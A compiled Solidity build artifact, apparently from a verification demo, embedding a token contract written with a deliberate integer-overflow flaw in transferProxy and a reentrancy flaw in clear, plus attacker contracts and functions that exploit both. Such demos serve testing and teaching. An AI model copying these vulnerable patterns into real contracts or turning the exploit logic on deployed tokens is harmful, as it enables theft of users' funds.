{
  "contractName": "Demo",
  "abi": [
    {
      "inputs": [],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "getBalanceOfAttacker1",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "attack1_int_overflow",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBalanceOfAttacker2",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "attack2_reentrancy",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBenignUserBal",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "no_reentrancy",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040527392349ef835ba7ea6590c3947db6a11eee1a90cfd600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550730ce8daf9acba5111c12b38420f848396ed71cb3e600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055507371c7656ec7ab88b098defb751b7401b5f6d8976f600560006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055503480156200011057600080fd5b506103e86040516200012290620004a3565b6200012e919062000524565b604051809103906000f0801580156200014b573d6000803e3d6000fd5b506000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16604051620001dd90620004b1565b620001ea92919062000586565b604051809103906000f08015801562000207573d6000803e3d6000fd5b50600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040516200029a90620004bf565b620002a792919062000586565b604051809103906000f080158015620002c4573d6000803e3d6000fd5b50600460006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663cf053d9d30600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600560006040518563ffffffff1660e01b81526004016200038a949392919062000639565b6020604051808303816000875af1158015620003aa573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620003d09190620006c8565b5060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663cf053d9d30600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600560006040518563ffffffff1660e01b815260040162000456949392919062000639565b6020604051808303816000875af115801562000476573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906200049c9190620006c8565b50620006fa565b610938806200100183390190565b610510806200193983390190565b6104408062001e4983390190565b6000819050919050565b6000819050919050565b6000819050919050565b60006200050c620005066200050084620004cd565b620004e1565b620004d7565b9050919050565b6200051e81620004eb565b82525050565b60006020820190506200053b600083018462000513565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006200056e8262000541565b9050919050565b620005808162000561565b82525050565b60006040820190506200059d600083018562000575565b620005ac602083018462000575565b9392505050565b6000819050919050565b6000620005de620005d8620005d284620005b3565b620004e1565b620004d7565b9050919050565b620005f081620005bd565b82525050565b6000819050919050565b6000620006216200061b6200061584620005f6565b620004e1565b620004d7565b9050919050565b620006338162000600565b82525050565b600060808201905062000650600083018762000575565b6200065f602083018662000575565b6200066e6040830185620005e5565b6200067d606083018462000628565b95945050505050565b600080fd5b60008115159050919050565b620006a2816200068b565b8114620006ae57600080fd5b50565b600081519050620006c28162000697565b92915050565b600060208284031215620006e157620006e062000686565b5b6000620006f184828501620006b1565b91505092915050565b6108f7806200070a6000396000f3fe608060405234801561001057600080fd5b50600436106100625760003560e01c80633d4bcb73146100675780636e88a621146100855780639d29eca9146100a3578063ba3f2a32146100ad578063d30c7106146100cb578063ed710bde146100d5575b600080fd5b61006f6100df565b60405161007c91906106df565b60405180910390f35b61008d6101a3565b60405161009a91906106df565b60405180910390f35b6100ab61032d565b005b6100b56103b1565b6040516100c291906106df565b60405180910390f35b6100d361053b565b005b6100dd6105bf565b005b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b815260040161015d919061073b565b602060405180830381865afa15801561017a573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061019e9190610787565b905090565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b8152600401610221919061073b565b602060405180830381865afa15801561023e573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102629190610787565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b81526004016102dd919061073b565b602060405180830381865afa1580156102fa573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061031e9190610787565b61032891906107e3565b905090565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639e5faafc6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561039757600080fd5b505af11580156103ab573d6000803e3d6000fd5b50505050565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b815260040161042f919061073b565b602060405180830381865afa15801561044c573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906104709190610787565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b81526004016104eb919061073b565b602060405180830381865afa158015610508573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061052c9190610787565b61053691906107e3565b905090565b600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e857338e6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156105a557600080fd5b505af11580156105b9573d6000803e3d6000fd5b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663cf053d9d30600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff167f80000000000000000000000000000000000000000000000000000000000000017f80000000000000000000000000000000000000000000000000000000000000006040518563ffffffff1660e01b81526004016106809493929190610817565b6020604051808303816000875af115801561069f573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906106c39190610894565b50565b6000819050919050565b6106d9816106c6565b82525050565b60006020820190506106f460008301846106d0565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000610725826106fa565b9050919050565b6107358161071a565b82525050565b6000602082019050610750600083018461072c565b92915050565b600080fd5b610764816106c6565b811461076f57600080fd5b50565b6000815190506107818161075b565b92915050565b60006020828403121561079d5761079c610756565b5b60006107ab84828501610772565b91505092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b60006107ee826106c6565b91506107f9836106c6565b9250828201905080821115610811576108106107b4565b5b92915050565b600060808201905061082c600083018761072c565b610839602083018661072c565b61084660408301856106d0565b61085360608301846106d0565b95945050505050565b60008115159050919050565b6108718161085c565b811461087c57600080fd5b50565b60008151905061088e81610868565b92915050565b6000602082840312156108aa576108a9610756565b5b60006108b88482850161087f565b9150509291505056fea26469706673582212207fb6186265ede8f076c52f9174a87c60d5c765036f8aff68f1951ada8da0f53c64736f6c63430008120033608060405234801561001057600080fd5b50604051610938380380610938833981810160405281019061003291906100c0565b80600181905550600154600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550506100ed565b600080fd5b6000819050919050565b61009d8161008a565b81146100a857600080fd5b50565b6000815190506100ba81610094565b92915050565b6000602082840312156100d6576100d5610085565b5b60006100e4848285016100ab565b91505092915050565b61083c806100fc6000396000f3fe608060405234801561001057600080fd5b50600436106100575760003560e01c806318160ddd1461005c5780633d0a40611461007a57806370a08231146100965780638da5cb5b146100c6578063cf053d9d146100e4575b600080fd5b610064610114565b60405161007191906105e0565b60405180910390f35b610094600480360381019061008f919061065e565b61011a565b005b6100b060048036038101906100ab919061065e565b6102fb565b6040516100bd91906105e0565b60405180910390f35b6100ce610344565b6040516100db919061069a565b60405180910390f35b6100fe60048036038101906100f991906106e1565b610368565b60405161010b9190610763565b60405180910390f35b60015481565b6000600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905080600260008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254019250508190555060003373ffffffffffffffffffffffffffffffffffffffff16826040516024016101d591906105e0565b6040516020818303038152906040527f85892c24000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505060405161025f91906107ef565b6000604051808303816000865af19150503d806000811461029c576040519150601f19603f3d011682016040523d82523d6000602084013e6102a1565b606091505b505080915050806102b157600080fd5b6000600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550505050565b6000600260008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000828201600260008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205410156103b857600080fd5b600260008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205483600260008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205401101561044557600080fd5b600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205482600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020540110156104d257600080fd5b82600260008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254019250508190555081600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550818301600260008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254039250508190555060019050949350505050565b6000819050919050565b6105da816105c7565b82525050565b60006020820190506105f560008301846105d1565b92915050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061062b82610600565b9050919050565b61063b81610620565b811461064657600080fd5b50565b60008135905061065881610632565b92915050565b600060208284031215610674576106736105fb565b5b600061068284828501610649565b91505092915050565b61069481610620565b82525050565b60006020820190506106af600083018461068b565b92915050565b6106be816105c7565b81146106c957600080fd5b50565b6000813590506106db816106b5565b92915050565b600080600080608085870312156106fb576106fa6105fb565b5b600061070987828801610649565b945050602061071a87828801610649565b935050604061072b878288016106cc565b925050606061073c878288016106cc565b91505092959194509250565b60008115159050919050565b61075d81610748565b82525050565b60006020820190506107786000830184610754565b92915050565b600081519050919050565b600081905092915050565b60005b838110156107b2578082015181840152602081019050610797565b60008484015250505050565b60006107c98261077e565b6107d38185610789565b93506107e3818560208601610794565b80840191505092915050565b60006107fb82846107be565b91508190509291505056fea26469706673582212209124aab2fde1660d14d714ff53c77edc6619d51419436f80d4100af4def0ec5264736f6c634300081200336080604052600060025534801561001557600080fd5b5060405161051038038061051083398181016040528101906100379190610122565b816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505050610162565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100ef826100c4565b9050919050565b6100ff816100e4565b811461010a57600080fd5b50565b60008151905061011c816100f6565b92915050565b60008060408385031215610139576101386100bf565b5b60006101478582860161010d565b92505060206101588582860161010d565b9150509250929050565b61039f806101716000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c8063050cee9b1461004657806385892c24146100645780639e5faafc14610080575b600080fd5b61004e61008a565b60405161005b91906102aa565b60405180910390f35b61007e60048036038101906100799190610300565b6100ae565b005b61008861017c565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600160025410156101795760026000815480929190600101919050555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633d0a4061600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b8152600401610146919061034e565b600060405180830381600087803b15801561016057600080fd5b505af1158015610174573d6000803e3d6000fd5b505050505b50565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633d0a4061600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b81526004016101f7919061034e565b600060405180830381600087803b15801561021157600080fd5b505af1158015610225573d6000803e3d6000fd5b50505050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061027061026b6102668461022b565b61024b565b61022b565b9050919050565b600061028282610255565b9050919050565b600061029482610277565b9050919050565b6102a481610289565b82525050565b60006020820190506102bf600083018461029b565b92915050565b600080fd5b6000819050919050565b6102dd816102ca565b81146102e857600080fd5b50565b6000813590506102fa816102d4565b92915050565b600060208284031215610316576103156102c5565b5b6000610324848285016102eb565b91505092915050565b60006103388261022b565b9050919050565b6103488161032d565b82525050565b6000602082019050610363600083018461033f565b9291505056fea26469706673582212209d34d1a49a5675682101fa8855f14ba6b3996b52ca3a1536a954bcd6ff14ffdc64736f6c63430008120033608060405234801561001057600080fd5b506040516104403803806104408339818101604052810190610032919061011d565b816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550505061015d565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100ea826100bf565b9050919050565b6100fa816100df565b811461010557600080fd5b50565b600081519050610117816100f1565b92915050565b60008060408385031215610134576101336100ba565b5b600061014285828601610108565b925050602061015385828601610108565b9150509250929050565b6102d48061016c6000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c8063050cee9b1461004657806385892c2414610064578063e857338e14610080575b600080fd5b61004e61008a565b60405161005b91906101df565b60405180910390f35b61007e60048036038101906100799190610235565b6100ae565b005b6100886100b1565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b50565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633d0a4061600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b815260040161012c9190610283565b600060405180830381600087803b15801561014657600080fd5b505af115801561015a573d6000803e3d6000fd5b50505050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006101a56101a061019b84610160565b610180565b610160565b9050919050565b60006101b78261018a565b9050919050565b60006101c9826101ac565b9050919050565b6101d9816101be565b82525050565b60006020820190506101f460008301846101d0565b92915050565b600080fd5b6000819050919050565b610212816101ff565b811461021d57600080fd5b50565b60008135905061022f81610209565b92915050565b60006020828403121561024b5761024a6101fa565b5b600061025984828501610220565b91505092915050565b600061026d82610160565b9050919050565b61027d81610262565b82525050565b60006020820190506102986000830184610274565b9291505056fea2646970667358221220751a52d494effcd6ca2a87bb686e4b29a308493d534fe3412bae900eb385d60264736f6c63430008120033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\n\n/* Vulnerability examples:\n\n   reentrancy:\n   https://blog.chain.link/reentrancy-attacks-and-the-dao-hack/\n\n   integer overflow:\n   https://peckshield.medium.com/integer-overflow-i-e-proxyoverflow-bug-found-in-multiple-erc20-smart-contracts-14fecfba2759\n*/\npragma solidity >=0.8.0;\n\nabstract contract Token {\n    address public owner;\n    uint256 public totalSupply;\n\n    function balanceOf(\n        address _owner\n    ) public view virtual returns (uint256 balance);\n}\n\n/// @custom:tct invariant: forall x:address :: 0 <= balances[x] && balances[x] <= totalSupply\n/// @custom:tct invariant: sum(balances) == totalSupply\nabstract contract StandardToken is Token {\n    function balanceOf(\n        address _owner\n    ) public view override returns (uint256 balance) {\n        return balances[_owner];\n    }\n\n    mapping(address => uint256) balances;\n}\n\ncontract MultiVulnToken is StandardToken {\n    constructor(uint256 initialSupply) {\n        totalSupply = initialSupply;\n        balances[msg.sender] = totalSupply;\n    }\n\n    function transferProxy(\n        address _from,\n        address _to,\n        uint256 _value,\n        uint256 _fee\n    ) public returns (bool) {\n        unchecked {\n            require(balances[_from] >= _fee + _value);\n            require(balances[_to] + _value >= balances[_to]);\n            require(balances[msg.sender] + _fee >= balances[msg.sender]);\n\n            balances[_to] += _value;\n            balances[msg.sender] += _fee;\n            balances[_from] -= _value + _fee;\n            return true;\n        }\n    }\n\n    //This function moves all tokens of msg.sender to the account of \"_to\"\n    function clear(address _to) public {\n        unchecked {\n            uint256 bal = balances[msg.sender];\n            balances[_to] += bal;\n            bool success;\n            (success, ) = msg.sender.call(\n                abi.encodeWithSignature(\"receiveNotification(uint256)\", bal)\n            );\n            require(success);\n            balances[msg.sender] = 0;\n        }\n    }\n}\n\n//========================================================\ncontract reentrancy_attack {\n    MultiVulnToken public multiVulnToken;\n    address _to;\n    uint count = 0;\n    constructor(address _multiVulnTokenAddress, address __to) {\n        multiVulnToken = MultiVulnToken(_multiVulnTokenAddress);\n        _to = __to;\n    }\n    function receiveNotification(uint256) public {\n        unchecked {\t\n\t\t    if (count < 1) {\n\t\t        count++;\n\t\t        multiVulnToken.clear(_to);\n\t\t    }\n\t\t}\n    }\n    function attack() public {\n        multiVulnToken.clear(_to);\n    }\n}\ncontract no_reentrancy_attack {\n    MultiVulnToken public multiVulnToken;\n    address _to;\n    constructor(address _multiVulnTokenAddress, address __to) {\n        multiVulnToken = MultiVulnToken(_multiVulnTokenAddress);\n        _to = __to;\n    }\n    function receiveNotification(uint256) public {\n        //nothing special\n    }\n    function call_clear() public {\n        multiVulnToken.clear(_to);\n    }\n}\n\ncontract Demo {\n    MultiVulnToken MultiVulnTokenContractAddress;\n\n    address attacker1Address =\n        address(0x92349Ef835BA7Ea6590C3947Db6A11EeE1a90cFd); //just an arbitrary address\n    reentrancy_attack attacker2Address1;\n    address attacker2Address2 =\n        address(0x0Ce8dAf9acbA5111C12B38420f848396eD71Cb3E); //just an arbitrary address\n    no_reentrancy_attack benignUserAddress1;\n    address benignUserAddress2 =\n        address(0x71C7656EC7ab88b098defB751B7401B5f6d8976F); //just an arbitrary address\n\n    constructor() {\n        MultiVulnTokenContractAddress = new MultiVulnToken(1000);\n        attacker2Address1 = new reentrancy_attack(address(MultiVulnTokenContractAddress),attacker2Address2);\n        benignUserAddress1 = new no_reentrancy_attack(address(MultiVulnTokenContractAddress),benignUserAddress2);\n\n        //suppose attacker2Address1 has 5 tokens initially\n        MultiVulnTokenContractAddress.transferProxy(\n            address(this),\n            address(attacker2Address1),\n            5,\n            0\n        );\n\n        //suppose benignUserAddress has 5 tokens too\n        MultiVulnTokenContractAddress.transferProxy(\n            address(this),\n            address(benignUserAddress1),\n            5,\n            0\n        );\n    }\n\n    function getBalanceOfAttacker1() public view returns (uint256) {\n        return MultiVulnTokenContractAddress.balanceOf(attacker1Address);\n    }\n\n    function attack1_int_overflow() public {\n        MultiVulnTokenContractAddress.transferProxy(\n            address(this),\n            attacker1Address,\n            uint256(2 ** 255 + 1),\n            uint256(2 ** 255)\n        );\n    }\n\n    function getBalanceOfAttacker2() public view returns (uint256) {\n        return\n            MultiVulnTokenContractAddress.balanceOf(\n                address(attacker2Address1)\n            ) + MultiVulnTokenContractAddress.balanceOf(attacker2Address2);\n    }\n\n    function attack2_reentrancy() public {\n        attacker2Address1.attack();\n    }\n\n    function getBenignUserBal() public view returns (uint256) {\n        return\n            MultiVulnTokenContractAddress.balanceOf(\n                address(benignUserAddress1)\n            ) +\n            MultiVulnTokenContractAddress.balanceOf(\n                address(benignUserAddress2)\n            );\n    }\n\n    function no_reentrancy() public {\n        benignUserAddress1.call_clear();\n    }\n}\n",
  "sourcePath": "/Users/ashle/Desktop/demo/trace-symexec/MultiVulnToken.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.18+commit.87f61d96.Emscripten.clang"
  },
  "schemaVersion": "3.4.14",
  "updatedAt": "2023-06-29T18:16:11.665Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}